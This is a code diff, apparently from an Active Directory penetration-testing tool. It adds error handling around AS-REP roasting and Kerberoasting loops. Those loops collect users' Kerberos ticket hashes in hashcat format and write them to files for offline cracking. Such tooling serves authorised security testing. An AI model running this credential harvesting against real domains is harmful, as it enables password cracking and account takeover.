@@ -231,9 +231,11 @@ async def run_auto():
 			results = []
 			ks = KerberosTarget(domain)
 			ar = APREPRoast(ks)
-			res = await ar.run(cred, override_etype = [23])
-			results.append(str(res))	
-			
+			try:
+				res = await ar.run(cred, override_etype = [23])
+				results.append(str(res))	
+			except Exception as e:
+				print("asreproast for user %s failed. Reason: %s" % (cred, e))
 		filename = 'asreproast_%s_%s.txt' % (logon['domain'], datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S"))
 		with open(filename, 'w', newline = '') as f:
 				for thash in results:
@@ -242,16 +244,19 @@ async def run_auto():
 
 		results = []
 		for cred in spn_users:
-			spn_name = '%s@%s' % (cred.username, cred.domain)
-			if spn_name[:6] == 'krbtgt':
-				continue
-			ksspi = KerberoastSSPI()
 			try:
-				ticket = ksspi.get_ticket_for_spn(spn_name)
+				spn_name = '%s@%s' % (cred.username, cred.domain)
+				if spn_name[:6] == 'krbtgt':
+					continue
+				ksspi = KerberoastSSPI()
+				try:
+					ticket = ksspi.get_ticket_for_spn(spn_name)
+				except Exception as e:
+					errors.append((spn_name, e))
+					continue
+				results.append(TGSTicket2hashcat(ticket))
 			except Exception as e:
-				errors.append((spn_name, e))
-				continue
-			results.append(TGSTicket2hashcat(ticket))
+				print("spnroast-sspi for user %s failed. Reason: %s" % (cred, e))
 		
 		filename = 'spnroast_%s_%s.txt' % (logon['domain'], datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S"))
 		with open(filename, 'w', newline = '') as f:
